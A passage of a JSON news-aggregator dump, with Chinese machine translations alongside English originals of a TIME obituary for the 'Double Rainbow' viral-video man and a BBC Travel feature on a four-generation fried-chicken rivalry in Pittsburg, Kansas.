(2013)", "transed": 1, "url": "http://www.gresham.ac.uk/lectures-and-events/the-history-of-computing-in-colour", "via": "", "real_tags": ["彩色", "computing", "历史"]}, {"category": "", "categoryclass": "", "imagename": "c02f664c8c50f3a021fb07b83c624c1b.jpg", "infoid": 1001745, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "(加利福尼亚州马里波萨)--身材魁梧的山人保罗·L·瓦斯克斯(Paul L.Vasquez)在加利福尼亚州中部去世，他在看到两道彩虹时做出了令人敬畏的反应，推动他成为网络明星，并成为一名民间英雄。他57岁。\n马里波萨县验尸官办公室告诉莫德斯托蜜蜂，瓦斯克斯在社交媒体上自称约塞米蒂熊，周六早些时候在医院急诊室去世。\n死因尚未公布。瓦斯克斯最近在他的Facebook页面上发帖称，他去做冠状病毒检测，但得知了另一种未指明的疾病。\n2010年1月，瓦斯克斯在YouTube上发布了一段视频，视频是从他山边的房子里拍摄的，视频中有一组彩虹俯瞰约塞米蒂山谷。他在说明中指出，相机无法捕捉到彩虹的强度和亮度。\n但这并不是导致这段视频点击量达到4600万次的原因。这是瓦斯克斯的反应。\n在这段3分钟的视频中，当他看到彩虹时，他反复说“哇”，大笑，甚至抽泣。\n“这是一道横跨天空的双彩虹！”他叫道。\n那年夏天，脱口秀主持人吉米·基梅尔(Jimmy Kimmel)在推特上发布了这段视频，这段视频迅速走红，并导致它出现在Smartwater、微软和达美航空(Delta Air Lines)的多个电视节目和广告中。\n瓦斯克斯的朋友罗伯特·博查德告诉“蜜蜂”：“他的”双彩虹“基本上就是写了一本关于什么是病毒式视频的书。”他称瓦斯克斯是一个“令人惊叹的角色”，总是对世界充满热情。\n在2015年接受CNN采访时，瓦斯克斯说，在20世纪80年代中期搬到马里波萨之前，他曾是洛杉矶县的一名消防员，在那里他打零工，独自住在约塞米蒂国家公园附近的一座移动房屋里。\n作为一名大麻种植者和使用者，他说他拍摄视频时并不兴奋。他告诉CNN，他的孤独让他在更深的层面上与自然建立了联系，并给了他一种大多数人永远无法理解的自由。\n“你不能再看着彩虹而不想我，”他说。\n去拿案情摘要。注册接收您现在需要了解的头条新闻。\n如果您不希望通过电子邮件从Time接收促销优惠，请选中此框。\n你可以随时退订。注册即表示您同意我们的使用条款和隐私政策。\n为了您的安全，我们已向您输入的地址发送了确认电子邮件。点击链接确认您的订阅并开始接收我们的时事通讯。如果您在10分钟内没有得到确认，请检查您的垃圾邮件文件夹。", "note_en": "(MARIPOSA, Calif.) — Paul L. Vasquez, the burly mountain man whose awestruck reaction upon seeing a double rainbow propelled him to internet stardom and turned him into a folk hero, has died in Central California. He was 57.\n  Vasquez, who called himself Yosemitebear on social media, died early Saturday at a hospital emergency room, the Mariposa County coroner’s office told the  Modesto Bee.\n  The cause of death has not been released. Vasquez had recently posted on his Facebook page that he had gone to get tested for COVID-19 but learned about another unspecified ailment.\n  In January 2010, Vasquez posted  on YouTube a video shot from his mountainside house of a set of rainbows overlooking the Yosemite valley. He notes in the caption that the camera couldn’t capture the rainbows’ intensity and brightness.\n  But that wasn’t what led to 46 million views of the video. It was Vasquez’s reaction.\n  Over the course of the 3-minute video, he repeatedly said “whoa,” laughed and even sobbed as he marveled at the sight of the rainbows.\n  “It’s a double rainbow all the way across the sky!” he exclaimed.\n    The video went viral that summer after talk show host Jimmy Kimmel tweeted about it, and it led to appearances on a number of TV shows and commercials for Smartwater, Microsoft and Delta Air Lines.\n        “His ‘Double Rainbow’ basically wrote the book on what a viral video was,” Vasquez’s friend, Robert Borchard, told the Bee. He called Vasquez an “amazing character” who was always enthusiastic about the world.\n  In a 2015 interview with CNN, Vasquez said he was working as a Los Angeles County firefighter before moving in the mid 1980s to Mariposa, where he worked odd jobs and lived alone in a mobile home close to Yosemite National Park.\n  A cannabis grower and user, he said he wasn’t high when he shot the video. He told CNN that his solitude allowed him to connect to nature on a deep level and gave him a freedom most people could never understand.\n  “You can’t look at a rainbow anymore and not think about me,” he said.\n    Get The Brief. Sign up to receive the top stories you need to know right now.\n  Check the box if you do not wish to receive promotional offers via email from TIME.\n  You can unsubscribe at any time. By signing up you are agreeing to our  Terms of Use and  Privacy Policy\n    For your security, we&#39;ve sent a confirmation email to the address you entered. Click the link to confirm your subscription and begin receiving our newsletters. If you don&#39;t get the confirmation within 10 minutes, please check your spam folder.", "posttime": "2020-05-12 08:58:12", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "病毒,双重,rainbow,彩虹", "title": "2010年病毒式视频《双重彩虹男》逝世，享年57岁", "title_en": "'Double Rainbow Guy' From 2010 Viral Video Dies At 57", "transed": 1, "url": "https://time.com/5835065/double-rainbow-guy-viral-video-dies/", "via": "", "real_tags": ["病毒", "双重", "rainbow", "彩虹"]}, {"category": "", "categoryclass": "", "imagename": "2ef1627a5e325f847385f391db0263e2.jpg", "infoid": 1001744, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "移民、独创性和美国精神如何塑造了一场酝酿了四代人的美国炸鸡“战争”。\n位于美国大平原中心的堪萨斯州匹兹堡周边地区像一片广阔的草原。在这里，冬天的风吹得严寒；夏天的太阳晒干了土壤；来自这个2万人的社区的牧场主、农民和人们聚集在一起，观看周五晚上在当地高中举行的足球比赛。所有人都说，这个昔日的煤矿小镇相当宁静-也就是说，在炸鸡的话题出现之前。\n虽然旅行因冠状病毒爆发而被搁置，但BBC旅游将继续告知和激励我们的读者，他们既想去那里旅行，也想了解世界，提供一些故事来庆祝让这个世界如此精彩多样和令人惊叹的人民、地方和文化。\n有关特别与冠状病毒相关的旅行信息和故事，请阅读BBC新闻我们的主要同事的最新更新。\n在过去的80年里，这座不起眼的城市已经成为美国的炸鸡中心之一，这一切都始于两名女子在同一条街上开了相距300英尺的鸡肉连锁店-从而引发了一场当地的竞争，至今仍在酝酿之中。四代人过去了，他们的后代仍然使用他们祖母的食谱来延续他们的遗产，在许多方面，这些女人是谁，她们的脆鸟是如何得到匹兹堡的咯咯声，充分说明了美国心脏地带的心脏和历史。\n匹兹堡周围的平原一直是大量烟煤矿藏的所在地。这些漆黑的岩石曾经非常丰富，以至于在地面上发现了它们。曾经住在这里的奥萨奇美洲原住民称它为“生火的黑色岩石”，并与白人定居者进行交易。\n第一批矿工于1866年抵达，也就是美国内战结束一年后。挖深的竖井和将大量的煤分开是危险的、令人筋疲力尽的工作。很快，欧洲各地都发出通知，寻找移民来匹兹堡和周围的克劳福德县工作。在1914年这里的煤炭生产高峰期，超过12000名矿工和他们的家人将克劳福德县作为家，这片大约有5.5万人口的农村地区生产了美国三分之一以上的煤炭。\n在该地区定居的家庭之一是雷哈克一家，他们在20世纪初从奥地利乘船来到这里，带着他们年幼的女儿安妮(Annie)。十几岁时，安妮嫁给了查尔斯·皮切勒。这对夫妇有三个孩子，并在查尔斯工作的匹兹堡郊外煤矿的阴影下买了一栋房子。\n1933年3月的一天，在查尔斯值班的过程中，矿井哨声响起了四声，表明发生了一起事故。查尔斯在矿道上被一辆运煤车撞了。他的右腿被当场截肢，左腿严重残废。当时，没有工人补偿或残疾保险这样的东西，安妮被迫在美国大萧条期间独自供养她的五口之家。\n为了不让家人挨饿，安妮开始以几便士的价格向经过她家门前的矿工出售火腿和小牛肉三明治。这两个人在皮切勒家离户外不远的小白色房子外的桦树和枫树的树荫下吃饭，喝着安妮自制的烈性酒，她以两夸脱0.25美元的价格卖出了这杯酒。\n安妮的孙子安东尼·皮切勒(Anthony Pichler)说：“奶奶从来没有太多谈论过那些时候，但那一定很艰难。”“但是奶奶也很坚强，这就是我们今天在这里的原因。”\n1934年，安妮为了寻找发展生意的方法，注意到自家前院所有的散养鸡，开始卖炸鸡晚餐。她会拧断鸟儿的脖子，迅速清理干净，把它们切成碎片，然后在她狭小的厨房里的燃煤炉子上油炸。周六，安妮会把家具从家里的起居室搬出来，在他们的小房子里摆几张桌子给用餐者。她还准备了土豆沙拉，卷心菜，腌制的辣椒和切成片的西红柿作为配菜，并用一片白面包使饭菜圆满结束。有时，用餐者会留下来跳舞，一直跳到凌晨。\n安妮开始创业后不久的一天，当地一位喜欢安妮烹饪的医生建议她把自己的土豆生意命名为“安妮鸡肉”。从那以后，这个名字就像油渍一样粘在平底锅上。\n有时，用餐者会留下来跳舞，一直跳到凌晨。\n1941年，一对德国移民乔和玛丽·泽恩加斯特(Joe Zerngast)住在离皮切勒夫妇几个门的地方。乔在矿井工作时是一名“枪手”，这意味着他会深入矿井，点燃炸药，然后跑出去-希望是在炸药爆炸之前。这是矿井里最危险的工作之一，20年后，“黑肺病”(煤工尘肺病)缩短了他的职业生涯，留下玛丽来养家糊口。\n泽恩斯塔斯夫妇的前院里也有鸡咯咯叫着，一个大的铸铁平底锅和一个燃煤炉子。和安妮一样，玛丽也是个不错的厨师。因此，就像皮切勒夫妇所做的那样，泽恩斯塔斯夫妇清理了他们小客厅里的家具，摆好了桌子，开始卖炸鸡晚餐，配上土豆沙拉和卷心菜。\n鸡肉安妮和鸡玛丽很快就展开了友好的竞争，这个紧密联系的社区的当地人不得不选择一方。\n“我需要活下去，”玛丽的孙子拉里·泽恩加斯特(Larry Zerngast)回忆玛丽对家人说的话。\n起初，泽恩斯塔斯人称他们的小地方为“乔和玛丽之家”。他们在起居室里有一个自动点唱机，就像在安妮家一样，人们经常跳舞跳到凌晨。如果当地人在半夜到达，渴望吃炸鸡，他们经常会敲门，大喊：“鸡，玛丽！鸡肉，玛丽！“。玛丽会打开门，点起煤炉，把鸡肉炸到天亮--这样，玛丽鸡肉就诞生了。\n皮切勒和泽恩加斯特家的小房子很快就忙于用餐和跳舞，以至于他们的家人不得不搬家，这样他们就可以把以前的家专门用来经营餐饮业。第二次世界大战后，关于这些家庭制作的令人垂涎三尺的油炸禽类的消息继续传开，家禽朝圣者会驱车数小时穿越堪萨斯州，在安妮或玛丽餐厅用餐，有时两家都去。20世纪60年代和70年代，随着越来越多的人成群结队地在自己的场所用餐，女士们拆除了原来的房子，再次扩建，建造了配备商业厨房的现代餐厅，可以容纳300人左右，而不是30人。\n安妮的孙女唐娜·利波塔夫(Donna Lipotarv)说：“她总是面带微笑，会叫出客人的名字。”她回忆说，安妮的女服务员总是穿着清爽的白色连衣裙和围裙。“她很可爱，很温柔，不，我想她今天不会赞成我的运动衫的。”\n尽管鸡肉安妮和鸡玛丽的食谱和配菜几乎相同，但它们很快就形成了友好的竞争关系，这个紧密联系的社区的当地人不得不选择立场，并小心谁看到他们进入哪家餐厅的门。\n利波格列夫最早的记忆是和祖母一起在房子里工作，清理桌子和招待客人。偶尔，安妮会让她骑着自行车沿着街道数一数鸡玛丽的停车场里有多少辆车。利波格列夫说：“我认为奶奶对正在发生的事情保持警惕。”“我们的停车场总是和玛丽的一样满。”\n我爷爷乔总是说，‘不要背弃皮切勒，你不能相信他们！’\n1982年，皮切勒夫妇试图将两家餐馆前面的小街重新命名为“鸡安妮之路”。当泽恩斯塔斯人对此表示反对时，这一事件以“纽约客”上一篇题为“炸鸡战争”的半开玩笑的文章登上了全国头条。\n玛丽的孙女唐娜·泽恩加斯特(Donna Zerngast)笑着说：“我的爷爷乔总是说，‘不要背弃皮切勒，你不能相信他们！’”，玛丽的孙女唐娜·泽恩加斯特(Donna Zerngast)笑着说。\n今天，匹兹堡的第一批炸鸡家族仍然在经营，Lipotarv经营着Annie的鸡肉，拉里·泽恩加斯特(Larry Zerngast)经营着鸡玛丽鸡店，安东尼·皮切勒(Anthony Pichler)经营着皮克勒的鸡安妮餐馆，旁边还有一个不太可能的共同所有者：唐娜·泽恩加斯特(Donna Zerngast)，她肯定没有听从乔爷爷的建议，现在已经和一个皮切勒人结婚54年了。\n除了建筑物的大小和他们自己不再绞尽脑汁的事实外，这三家公司的经营方式几乎与安妮和玛丽在20世纪30年代和40年代的做法几乎相同。每个人都还在打他们的禽类，然后在用猪油炸它们之前几分钟给它们涂上面粉和盐。玛丽鸡肉的面糊里用的是鸡蛋和牛奶；而安妮鸡肉的原汁原味和皮切勒鸡肉安妮的面糊里只用鸡蛋。\n我们有从全国各地赶来的顾客，因为他们听说过我们和堪萨斯州这一地区的炸鸡。\n对于这位中西部人来说，安妮和玛丽家的鸡肉脆而轻脆，里面嫩而多汁。但匹兹堡居民知道其中的不同之处。\n“你可以把一盘我们的鸡肉放在一盘他们的鸡肉旁边，当地人就会知道哪一种是哪种，”拉娜·布鲁克斯(Lana Brooks)说。她在鸡玛丽餐厅工作了51年，她声称两家人使用的调味料是一样的，只是调味料的量不同。“我认为，这两家餐厅成功的关键在于，我们仍然像玛丽和安妮那样做事。这是对一生都来这里的家庭的吸引力的一部分。这是我们社区遗产的一部分。“。\n多年来，安妮和玛丽的鸡肉餐厅启发了克劳福德县至少另外九家土制炸鸡连锁店。“我们有非常忠实的顾客，但每周都有顾客从全国各地赶来，因为他们听说过我们和堪萨斯州这一地区的炸鸡，”米西·皮切勒(Missy Pichler)说。她是皮切勒家族的第四代人，在安妮鸡肉餐厅工作，她十几岁的女儿也在那里当服务员。\n每隔几个月，史蒂夫和梅丽莎·普利斯和他们的儿子们就会从密苏里州的斯普林菲尔德开车大约两个小时去匹兹堡，一次去玛丽鸡肉店吃饭，另一次去安妮鸡肉店吃饭。\n“我最喜欢安妮的鸡肉，但史蒂夫最喜欢玛丽的，”梅丽莎说。“但卷心菜沙拉正好相反。我真的很喜欢玛丽的卷心菜沙拉里多加的大蒜。史蒂夫不同意这种说法。“。\n这就是克劳福德县的做法。这里的家庭因炸鸡和固定食品发生了一场美味的争吵。\nAl EShelbrenner在匹兹堡北部长大，近60年来一直吃炸鸡晚餐。虽然他承认玛丽鸡肉很好吃，但他坚持认为不同之处在于调味料。今天，他维持着父母的忠诚，现在带着孙子孙女去小鸡安妮家。埃谢布伦纳说：“我的家人每个星期天都会带我们去安妮鸡肉店，这就是我从小长大的环境。”“这里的人不会真的对此争论不休，因为我们尊重每个人都有自己的最爱，他们的家族传统。”\n事实上，EShelbrenner夫妇非常喜欢Annie鸡肉餐厅，他们要求餐厅为他们全家的圣诞聚会提供食物。\n“我想我最想吃的是土豆沙拉和卷心菜沙拉，”克里斯蒂安·沃克(Kristian Walker)说，他在匹兹堡出生长大，现在住在宾夕法尼亚州的哈里斯堡。虽然他不再有家人住在这个地区，但他有一次开了5个小时的车，就为了能在匹兹堡吃一顿炸鸡晚餐。\n他说：“我遇到过来自全国各地的人，他们一知道我来自匹兹堡，就开始询问我最喜欢的炸鸡，并告诉我他们吃过多少次。”“我们可能不是世界知名的，但全世界肯定有很多人知道堪萨斯州克劳福德县的炸鸡。”\n在Facebook上为我们点赞，或者在Twitter和Instagram上关注我们，就可以加入300多万BBC旅游粉丝的行列。\n如果你喜欢这个故事，可以订阅bbc.com每周一期的时事通讯，名为“基本清单”(the Essential List&34；)。精选BBC《未来》、《文化》、《职场生活》和《旅行》中的故事，每周五发送到您的收件箱。", "note_en": "How immigration, ingenuity and the American spirit shaped a US fried chicken “war” that’s been simmering for four generations.\n        Located in the heart of the US’ Great Plains, the area around Pittsburg, Kansas, spreads out like one vast prairie. Here, the winds blow bitter cold in winter; the sun parches the soil in summer; and ranchers, farmers and folks from this 20,000-person community gather to watch Friday night football at the local high school. By all accounts, this former coal-mining town is pretty tranquil – that is, until the topic of fried chicken comes up.\n While travelling is on hold due to the coronavirus outbreak, BBC Travel will continue to inform and inspire our readers who want to learn about the world as much as they want to travel there, offering stories that celebrate the people, places and cultures that make this world so wonderfully diverse and amazing.\n For travel information and stories specifically related to coronavirus, please read  the latest updates from our colleagues at BBC News.\n Over the past 80 years, this unassuming city has become one of the US’ fried chicken epicentres, and it all started when two women opened chicken joints 300ft apart on the same street – thus creating a local rivalry that still spits and simmers today. Four generations later, their descendants still use their grandmothers’ recipes to continue their legacies, and in many ways, who these women were and how their crispy birds got Pittsburg clucking speaks volumes about the heart and history of America’s Heartland.\n  The plains surrounding Pittsburg have always been home to large deposits of bituminous coal. These pitch-black rocks were once so abundant that they were found above ground. The Osage Native Americans who once lived here called it “black rocks that make fire”, and they traded it with white settlers.\n The first miners arrived in 1866, just one year after the US Civil War ended. Digging deep shafts and breaking apart loads of coal was dangerous, back-breaking work. Soon, notices went out across Europe seeking immigrants to come work in Pittsburg and the surrounding Crawford County. At the height of coal production here in 1914, more than 12,000 miners and their families called Crawford County home, and this rural patch of roughly 55,000 people produced more than one third of the US’ coal.\n One of the families who settled in the area was the Rehaks, who sailed over from Austria at the turn of the 20th Century, carrying their infant daughter, Annie. As a teenager, Annie married Charles Pichler. The couple had three children and bought a house in the shadow of the coal mine just outside Pittsburg where Charles worked.\n  In the middle of Charles’ shift one day in March 1933, the mine whistle blew four times, indicating that there had been an accident. Charles had been hit by a coal cart on the mine tracks. His right leg was amputated on site and his left leg was badly maimed. At the time, there was no such thing as workman’s compensation or disability insurance, and Annie was forced to provide for her family of five in the middle of the US’  Great Depression all alone.\n  To keep her family from starving, Annie began selling ham and veal sandwiches for a few pennies to miners passing the front of her house. The men ate under the shade of the birch and maple trees outside the Pichlers’ little white house, not far from the outhouses, and drank Annie’s homemade hooch, which she sold for $0.25 for two quarts.\n “Grandma never talked much about those times, but it had to have been tough,” said Anthony Pichler, Annie’s grandson. “But Grandma was tough too, and that’s why we’re here today.”\n  In 1934, looking for a way to grow her business and noting all the free-range chickens in her front yard, Annie started selling fried chicken dinners. She’d wring the birds’ necks, quickly clean and cut them into pieces and fry them on a coal-heated stove in her tiny kitchen. On Saturdays, Annie would move the furniture from the family’s living room and set up a few tables for diners in their tiny home. She also prepared potato salad, coleslaw, pickled peppers and sliced tomatoes from her garden as sides, and rounded the meals out with a slice of white bread. Sometimes, diners would stay and end up dancing until the wee hours of the morning.\n One day not long after Annie started her business, a local doctor and fan of Annie’s cooking suggested she name her homespun business “Chicken Annie’s”. The name has stuck like grease on a pan ever since.\n Sometimes, diners would stay and end up dancing until the wee hours of the morning\n In 1941, a pair of German immigrants, Joe and Mary Zerngast, lived a few doors down from the Pichlers. Joe worked the mines as a “shot-firer”, meaning he was the guy who would go deep inside, light the dynamite and run out – hopefully before it exploded. It was one of the most dangerous jobs in the mines, and after 20 years, “black lung” (coal workers’ pneumoconiosis) cut his career short, leaving Mary to provide for the family.\n  The Zerngasts also had chickens clucking around in their front yard, a big cast-iron skillet and a coal-fired stove. And like Annie, Mary was a pretty good cook, too. So, just as the Pichlers had done, the Zerngasts cleared out the furniture in their little living room, set up tables and began selling fried chicken dinners with potato salad and coleslaw.\n Chicken Annie’s and Chicken Mary’s quickly developed a friendly rivalry, with locals in this tight-knit community having to pick a side\n “I needed to survive,” Larry Zerngast, Mary’s grandson, recalled Mary telling the family.\n At first, the Zerngasts called their little place, “Joe and Mary’s”. They had a jukebox in the living room and, just like at Annie’s, people often danced until the early morning. If locals under the influence arrived in the middle of the night craving fried chicken, they would often pound on the door, shouting, “Chicken, Mary! Chicken, Mary!”. Mary would open the door, fire up the coal stove and fry chicken until dawn – thus, Chicken Mary’s was born.\n  The Pichler’s and Zerngast’s little houses soon got so busy with dinners and dancing that the families had to move so they could devote their former homes solely to the restaurant business. Word continued to spread of the families’ mouth-watering, deep-fried birds after World War Two, and poultry pilgrims would drive hours across Kansas to dine at Annie’s or Mary’s – or sometimes, both. As more people flocked to eat at their venues in the 1960s and ‘70s, the ladies tore down their original houses and expanded again, building modern restaurants with commercial kitchens that could seat about 300 instead of 30.\n “She always had a smile and would greet her guests by name,” said Donna Lipoglav, Annie’s granddaughter, who recalled that Annie’s waitresses always wore crisp white dresses and aprons. “She was very sweet and gentle, and no, I don’t think she would approve of my sweatshirt today.”\n Despite having nearly identical recipes and side dishes, Chicken Annie’s and Chicken Mary’s quickly developed a friendly rivalry, with locals in this tight-knit community having to pick a side and be careful who saw them entering the door of which restaurant.\n  Lipoglav’s earliest memories are of working in the house with her grandmother, clearing tables and serving guests. Occasionally, Annie would ask her to ride her bike down the street to count the number of cars in Chicken Mary’s parking lot. “I think Grandma was alert as to what was going on,” Lipoglav said. “Our parking lot was always just as full as Mary’s.”\n My Grandpa Joe always said, ‘Don’t turn your back on a Pichler, you can’t trust them!\n In 1982, the Pichlers tried to rename the small street running in front of both establishments “Chicken Annie’s Road”. When the Zerngasts objected to that, the incident made national headlines with a tongue-in-cheek article in The New Yorker titled, “ Fried-Chicken War”.\n “My Grandpa Joe always said, ‘Don’t turn your back on a Pichler, you can’t trust them!’,” Donna Zerngast, Mary’s granddaughter, laughed.\n  Today, Pittsburg’s first families of fried chicken are still at it, with Lipoglav running  Chicken Annie’s Original, Larry Zerngast running  Chicken Mary’s and Anthony Pichler running  Pichler’s Chicken Annie’s alongside an unlikely co-owner: Donna Zerngast, who must not have listened to Grandpa Joe’s advice and has now been married to a Pichler for the last 54 years.\n  Other than the size of the buildings and the fact that they’re no longer wringing the chickens’ necks themselves, all three businesses still do everything just about the same way Annie and Mary did in the 1930s and ‘40s. Each still batters their birds, then coats them with flour and salt just minutes before frying them in lard. Chicken Mary’s uses egg and milk in the batter; whereas Chicken Annie’s Original and Pichler’s Chicken Annie’s uses just egg.\n We have customers who just show up from all across the country because they’ve heard of us and the fried chicken in this part of Kansas\n To this Midwesterner, the chicken at both Annie’s and Mary’s has a crisp, light crunch and a tender, juicy inside. But Pittsburg residents know the difference.\n “You can put a plate of our chicken next to a plate of their chicken and locals will know which one is which,” said Lana Brooks, who has worked at Chicken Mary’s for 51 years and claims that both families use the same seasonings, just in different amounts. “I think the key to success in both restaurants is that we’re still doing things exactly as Mary and Annie did it. That’s part of the appeal to families who have been coming here their whole life. It’s a part of our community heritage.”\n  Over the years, Chicken Annie’s and Mary’s have inspired at least nine other homespun fried chicken joints in Crawford County. “We have very loyal customers, but every week, we have customers who just show up from all across the country because they’ve heard of us and the fried chicken in this part of Kansas,” said Missy Pichler, the fourth generation of Pichlers to work at Chicken Annie’s Original and whose teenage daughter also waits tables there.\n Every few months, Steve and Melissa Pulis and their boys drive about two hours from Springfield, Missouri, to Pittsburg, eating at Chicken Mary’s on one trip and Chicken Annie’s the next.\n “I like Annie’s chicken the best, but Steve likes Mary’s the best,” said Melissa. “But it’s the opposite with the coleslaw. I really like the extra garlic in Mary’s coleslaw. Steve disagrees.”\n  And that’s the way it goes in Crawford County. Families here are divided in a delicious brawl over fried chicken and the fixins.\n Al Eshelbrenner grew up just north of Pittsburg and has been eating fried chicken dinners for nearly 60 years. While he admits that Chicken Mary’s is good, he insists that the difference lies in the seasoning. Today, he maintains his parents’ allegiance and now takes his grandchildren to Chicken Annie’s. “My folks would take us to Chicken Annie’s every Sunday and that’s just what I grew up with,” said Eshelbrenner. “People don’t really argue about it down here because we respect that everyone has their favourites, their family tradition.”\n In fact, the Eshelbrenners are so devoted to Chicken Annie’s that they ask the restaurant to cater their family’s Christmas gatherings.\n  “I think it’s the potato salad and coleslaw that I crave the most,” said Kristian Walker, who was born and raised in Pittsburg but now lives in Harrisburg, PA. Although he no longer has family living in the area, he once drove five hours out of his way just so he could have a fried chicken dinner in Pittsburg.\n “I’ve met people from across the country who, as soon as they learn I’m from Pittsburg, start asking me about my favourite fried chicken and telling about the times they’ve been able to eat [it],” he said. “We might not be world famous, but there are sure a lot of people around the world who know about the fried chicken of Crawford County, Kansas.”\n Join more than three million BBC Travel fans by liking us on  Facebook , or follow us on  Twitter  and  Instagram .\n If you liked this story,  sign up for the weekly bbc.com features newsletter  called &#34;The Essential List&#34;. A handpicked selection of stories from BBC Future, Culture, Worklife and Travel, delivered to your inbox every Friday.", "posttime": "2020-05-12 08:43:05", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "炸鸡,fried,玛丽", "title": "美国的“炸鸡大战”", "title_en": "America’s ‘Fried Chicken War’", "transed": 1, "url": "http://www.bbc.com/travel/story/20200429-americas-fried-chicken-war", "via": "", "real_tags": ["炸鸡", "fried", "玛丽"]}]